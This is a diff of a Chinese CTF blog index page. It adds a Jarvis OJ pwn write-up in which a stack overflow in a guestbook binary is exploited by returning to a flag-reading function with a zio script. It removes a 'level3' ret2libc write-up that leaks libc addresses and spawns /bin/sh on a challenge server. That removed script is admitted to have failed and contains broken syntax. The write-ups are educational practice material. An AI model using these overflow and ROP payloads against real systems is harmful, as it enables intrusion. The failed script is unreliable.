@@ -251,6 +251,151 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/31/tell me someting/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="xfgg">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xfgg">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/07/31/tell me someting/" itemprop="url">tell me something</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-31T12:55:23+08:00">
+                2019-07-31
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/jarvi-OJ/" itemprop="url" rel="index">
+                    <span itemprop="name">jarvi OJ</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="0x01-寻找漏洞"><a href="#0x01-寻找漏洞" class="headerlink" title="0x01 寻找漏洞"></a>0x01 寻找漏洞</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">xfgg@ubuntu:~/Downloads$ file guestbook.d3d5869bd6fb04dd35b29c67426c0f05 </span><br><span class="line">guestbook.d3d5869bd6fb04dd35b29c67426c0f05: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=7429502fc855237f3f8eeceb262ddcf6b2c2854e, not stripped</span><br><span class="line"></span><br><span class="line">64位程序</span><br><span class="line"></span><br><span class="line">xfgg@ubuntu:~/Downloads$ checksec guestbook.d3d5869bd6fb04dd35b29c67426c0f05</span><br><span class="line">[*] <span class="string">'/home/xfgg/Downloads/guestbook.d3d5869bd6fb04dd35b29c67426c0f05'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line"></span><br><span class="line">只开启nx保护</span><br><span class="line"></span><br><span class="line">ida分析</span><br><span class="line"></span><br><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v4; // [rsp+0h] [rbp-88h]</span><br><span class="line"></span><br><span class="line">  write(1, <span class="string">"Input your message:\n"</span>, 0x14uLL);</span><br><span class="line">  <span class="built_in">read</span>(0, &amp;v4, 0x100uLL);</span><br><span class="line">  <span class="built_in">return</span> write(1, <span class="string">"I have received your message, Thank you!\n"</span>, 0x29uLL);</span><br><span class="line">&#125;</span><br><span class="line">有个<span class="built_in">read</span>栈溢出漏洞 </span><br><span class="line"></span><br><span class="line">int good_game()</span><br><span class="line">&#123;</span><br><span class="line">  FILE *v0; // rbx</span><br><span class="line">  int result; // eax</span><br><span class="line">  char buf; // [rsp+Fh] [rbp-9h]</span><br><span class="line"></span><br><span class="line">  v0 = fopen(<span class="string">"flag.txt"</span>, <span class="string">"r"</span>);</span><br><span class="line">  <span class="keyword">while</span> ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    result = fgetc(v0);</span><br><span class="line">    buf = result;</span><br><span class="line">    <span class="keyword">if</span> ( (_BYTE)result == -1 )</span><br><span class="line">      <span class="built_in">break</span>;</span><br><span class="line">    write(1, &amp;buf, 1uLL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">有个fopenflag 就很简单了 溢出返回就可以了</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x02-思路分析"><a href="#0x02-思路分析" class="headerlink" title="0x02 思路分析"></a>0x02 思路分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">查看main函数的栈</span><br><span class="line">-0000000000000088                 db ? ; undefined</span><br><span class="line">-0000000000000087                 db ? ; undefined</span><br><span class="line">-0000000000000086                 db ? ; undefined</span><br><span class="line">-0000000000000085                 db ? ; undefined</span><br><span class="line">-0000000000000084                 db ? ; undefined</span><br><span class="line"></span><br><span class="line">0x88位就可以溢出</span><br><span class="line"></span><br><span class="line">查看good_game的地址</span><br><span class="line">.text:0000000000400620                 push    rbx</span><br><span class="line">.text:0000000000400621                 mov     esi, offset modes ; <span class="string">"r"</span></span><br><span class="line">.text:0000000000400626                 mov     edi, offset filename ; <span class="string">"flag.txt"</span></span><br><span class="line">.text:000000000040062B                 sub     rsp, 10h</span><br><span class="line">.text:000000000040062F                 call    _fopen</span><br><span class="line">.text:0000000000400634                 mov     rbx, rax</span><br><span class="line">.text:0000000000400637                 jmp     short loc_400654</span><br><span class="line"></span><br><span class="line">0x400620为sys_addr</span><br></pre></td></tr></table></figure>
+
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">学习使用zio库</span><br><span class="line"></span><br><span class="line">import zio</span><br><span class="line">payload = <span class="string">"A"</span> * 0x88 + <span class="string">"\x20\x06\x40\x00\x00\x00\x00\x00"</span></span><br><span class="line">p = zio.zio((<span class="string">"pwn.jarvisoj.com"</span>, 9876))</span><br><span class="line">p.write(payload)</span><br><span class="line">Io.interact()</span><br></pre></td></tr></table></figure>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/30/pwn常用的命令/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1642,158 +1787,11 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/27/level3/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="xfgg">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="xfgg">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/07/27/level3/" itemprop="url">level3</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-27T19:23:08+08:00">
-                2019-07-27
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/攻防世界/" itemprop="url" rel="index">
-                    <span itemprop="name">攻防世界</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h3 id="0x01-寻找漏洞"><a href="#0x01-寻找漏洞" class="headerlink" title="0x01 寻找漏洞"></a>0x01 寻找漏洞</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">xfgg@ubuntu:~/Downloads$ checksec level3</span><br><span class="line">[*] <span class="string">'/home/xfgg/Downloads/level3'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">只有nx保护</span><br><span class="line"></span><br><span class="line">ida分析</span><br><span class="line"></span><br><span class="line">ssize_t vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">char buf; // [esp+0h] [ebp-88h]</span><br><span class="line"></span><br><span class="line">write(1, <span class="string">"Input:\n"</span>, 7u);</span><br><span class="line"><span class="built_in">return</span> <span class="built_in">read</span>(0, &amp;buf, 0x100u);</span><br><span class="line">&#125;</span><br><span class="line">很明显的栈溢出漏洞，但是没有system函数和/bin/sh字符串了 这里有一个新的模式，泄露函数got表中的地址获取到库中某个函数的真正加载地址，通过偏移找出函数的库，通过然后找出其他函数的真正加载地址，包括system函数也包括/bin/sh字符串</span><br><span class="line"></span><br><span class="line">xfgg@ubuntu:~/Downloads$ ROPgadget --binary level3 --only <span class="string">"pop|ret"</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x0804851b : pop ebp ; ret</span><br><span class="line">0x08048518 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080482f1 : pop ebx ; ret</span><br><span class="line">0x0804851a : pop edi ; pop ebp ; ret</span><br><span class="line">0x08048519 : pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080482da : ret</span><br><span class="line">0x080483ce : ret 0xeac1</span><br><span class="line"></span><br><span class="line">我们选中这里作为ROP的位置</span><br><span class="line">0x08048519 : pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080482da : ret</span><br><span class="line">0x080483ce : ret 0xeac1</span><br></pre></td></tr></table></figure>
-
-<h3 id="0x02-思路分析"><a href="#0x02-思路分析" class="headerlink" title="0x02 思路分析"></a>0x02 思路分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">构造payload: payload=’A’0x88+’A’4+p32(plt_write)+p32(main_addr)+p32(1)+p32(got_write)+p32(4)</span><br><span class="line"></span><br><span class="line">这一部分是为了泄露出来write 函数的got表内容 payload = “A” 0x88 + “A” 4 + p32(plt_read) + p32(pop_pop_pop_ret) + p32(0) + p32(bss_addr) + p32(8)</span><br><span class="line"></span><br><span class="line">这一部分会返等待输入，把输入的内容放到bss_addr。返回地址pop_pop_pop_ret保证堆栈平衡 payload+=p32(system_addr)+p32(0x77777777)+p32(bin_sh_addr)</span><br><span class="line"></span><br><span class="line">这一部分是为了执行system(“/bin/sh”)函数。会执行system(<span class="string">"/bin/sh"</span>)是因为发送过去的payload在函数返回时才会起作用</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">pop_pop_pop_ret=0x08048519</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">"/home/xfgg/level3"</span>) <span class="comment">##载入level3程序</span></span><br><span class="line"></span><br><span class="line">plt_write=elf.plt[<span class="string">"write"</span>]</span><br><span class="line">got_write=elf.got[<span class="string">"write"</span>]</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">"111.198.29.45"</span>,41869)</span><br><span class="line"><span class="comment">##获取level3的write的plt表和got表</span></span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line"><span class="comment">##因为程序中调用了write()函数，write()函数是从Libc中动态调用的，所以，我们可以根据write()在libc中的地址通过偏移泄露出##libc的版本</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"A"</span>0x88+<span class="string">"A"</span>4+p32(plt_write)+p32(pop_pop_pop_ret)+p32(1)+p32(got_write)+p32(4)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_addr=u32(p.recv(4))</span><br><span class="line"></span><br><span class="line"><span class="comment">## u32():表示unsigned long int,而且只接受4字节就够用了</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">"write_addr="</span>+hex(write_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">##这里泄露libc的版本，运行这段代码就能获取到write函数的运行地址(放在write_addr里面)。 运行结果为write_addr=0xf7dfad80为了获取到libc版本这里推荐一个网站https://libc.blukat.me/?q=write%3A0x7f2179c14440。可以在这里通过函数名和地址查询出运行库的版本也提供下载。（如果一个地址查到不止一个库版本可以试着再泄露一个函数) 当然也可以自动获取，这个更可靠，pwntools提供的有库LibcSearcher。由于本人的电脑重装，还没安这个库，所以，没有直接用，而是跟LibcSearcher一样的方式，先泄露然后查找</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##我选择的是libcsearcher</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="0x03-攻击"><a href="#0x03-攻击" class="headerlink" title="0x03 攻击"></a>0x03 攻击</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">write函数和libc泄露，写入system(<span class="string">'/bin/sh'</span>)</span><br></pre></td></tr></table></figure>
-
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">pop_pop_pop_ret=0x08048519</span><br><span class="line">elf=ELF(<span class="string">"/home/xfgg/level3"</span>)</span><br><span class="line">main_addr=0x08048484</span><br><span class="line">plt_write=elf.plt[<span class="string">"write"</span>]</span><br><span class="line"></span><br><span class="line">def leak(address):</span><br><span class="line">p.recvline()</span><br><span class="line">payload = <span class="string">"A"</span> 0x88 + <span class="string">"A"</span> 4 + p32(plt_write) + p32(main_addr) + p32(1) + p32(address) + p32(4)</span><br><span class="line">p.send(payload)</span><br><span class="line">data=p.recv(4)</span><br><span class="line"><span class="built_in">print</span> hex(u32(data))</span><br><span class="line"><span class="built_in">print</span> <span class="string">"%#x =&gt; %s"</span> % (address,(data or <span class="string">''</span>).encode(<span class="string">'hex'</span>))</span><br><span class="line"><span class="built_in">return</span> data</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">"111.198.29.45"</span>,41869)</span><br><span class="line"></span><br><span class="line">d=DynELF(leak,elf=ELF(<span class="string">"./level3"</span>))</span><br><span class="line">system_addr=d.lookup(<span class="string">'system'</span>,<span class="string">'libc'</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">"system_addr="</span>+hex(system_addr)</span><br><span class="line"></span><br><span class="line">bss_addr=0x0804a024</span><br><span class="line">plt_read=elf.plt[<span class="string">"read"</span>]</span><br><span class="line">p.recvline()</span><br><span class="line">sleep(1)</span><br><span class="line">payload = <span class="string">"A"</span> 0x88 + <span class="string">"A"</span> 4 + p32(plt_read) + p32(pop_pop_pop_ret) + p32(0) + p32(bss_addr) + p32(8)</span><br><span class="line">payload+=p32(system_addr)+p32(0x77777777)+p32(bss_addr)</span><br><span class="line"></span><br><span class="line">raw_input() <span class="comment">##raw_input():获取控制台的输入因为前面睡了一秒，所以，通过raw_input()获得控制台的输入，然后输入payload</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">"/bin/sh"</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line">不知道为什么失败了 ，这种题目还是要多做，有点难搞</span><br></pre></td></tr></table></figure>
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 
@@ -1839,7 +1837,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">20</span>
+                  <span class="site-state-item-count">21</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -1850,7 +1848,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-count">8</span>
                   <span class="site-state-item-name">categories</span>
                 </a>
               </div>
